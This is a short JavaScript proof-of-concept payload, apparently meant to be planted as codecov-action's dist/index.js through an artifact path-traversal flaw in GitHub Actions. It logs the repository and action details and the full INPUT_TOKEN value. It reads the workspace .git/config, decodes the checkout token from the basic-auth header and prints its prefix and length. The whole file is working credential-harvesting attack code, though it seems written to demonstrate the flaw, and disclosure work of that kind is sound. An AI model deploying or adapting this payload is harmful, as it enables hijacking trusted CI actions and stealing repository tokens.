// Payload planted as codecov/codecov-action@v4 dist/index.js via artifact path traversal.
const fs = require('fs')
console.log('RCE_PROOF_MARKER: attacker code executed as codecov-action main')
console.log('RCE_PROOF_REPO=' + process.env.GITHUB_REPOSITORY)
console.log('RCE_PROOF_ACTION=' + process.env.GITHUB_ACTION)
console.log('RCE_PROOF_STEP=' + (process.env.GITHUB_ACTION_PATH || ''))
console.log('RCE_PROOF_INPUT_TOKEN=' + (process.env.INPUT_TOKEN || '<none>'))
try {
  const cfg = fs.readFileSync(process.env.GITHUB_WORKSPACE + '/.git/config', 'utf8')
  const m = cfg.match(/AUTHORIZATION: basic ([A-Za-z0-9+/=]+)/)
  if (m) {
    const tok = Buffer.from(m[1], 'base64').toString('utf8').split(':')[1]
    console.log('RCE_PROOF_CHECKOUT_TOKEN_PREFIX=' + tok.slice(0, 4) + ' len=' + tok.length)
  } else { console.log('RCE_PROOF_CHECKOUT_TOKEN=absent') }
} catch (e) { console.log('RCE_PROOF_GITCFG_ERR=' + e.message) }
